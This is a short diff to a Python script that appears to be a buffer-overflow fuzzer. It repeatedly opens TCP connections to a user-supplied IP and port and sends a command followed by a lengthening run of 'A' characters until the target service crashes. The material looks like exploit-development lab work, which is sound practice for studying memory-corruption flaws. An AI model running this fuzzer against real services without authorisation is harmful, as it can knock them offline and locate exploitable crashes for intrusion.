@@ -21,22 +21,28 @@ if not re.match(r'[0-9]+(?:\.[0-9]+){3}', ip):
 
 else:
     port = int(input("Enter Port number here: "))
-    cmd_name = input(str("Enter the wanted cmd to check: "))
-    cmd_name = str.encode(cmd_name)
+    cmd_name = input("Enter the wanted cmd to check: ")
     #print(type(cmd_name))
 
     if port >= 1 and port <= 65535:
         while True:
             try:
+                    payload = cmd_name + ' /.:/' + buffer_over_the_rainbow
+                    print(payload)
+
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     s.connect((ip, port))
-                    s.send((cmd_name, ' /.:/' + buffer_over_the_rainbow))
+
+                    print("Sending the payload: " + str(len(payload)))
+                    s.send((payload.encode()))
+            
                     s.close()
                     sleep(1)
                     buffer_over_the_rainbow += "A"*100
             
             except Exception as e:
                     print(e)
+                    print(s.send((payload.encode())))
                     print ("Fuzzing crashed at %s bytes, check the inputs that you have provided" % str(len(buffer_over_the_rainbow)))
                     sys.exit()
     else:
